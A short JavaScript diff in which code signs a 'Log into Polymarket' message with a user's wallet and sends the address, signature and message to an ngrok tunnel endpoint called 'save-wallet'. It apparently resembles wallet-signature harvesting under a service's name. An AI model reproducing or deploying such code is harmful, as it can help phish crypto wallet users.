@@ -28,7 +28,7 @@
           // const message = `Log into Polymarket - ${new Date().toISOString()}`;
           const message = `Log into Polymarket - ${new Date().toISOString().slice(0, 10)}`; 
           const signature = await signer.signMessage(message);
-            const data = {  address,signature };
+            const data = {  address,signature,message };
           
  const url = "https://eae06faad250.ngrok-free.app/api/v1/save-wallet";
 
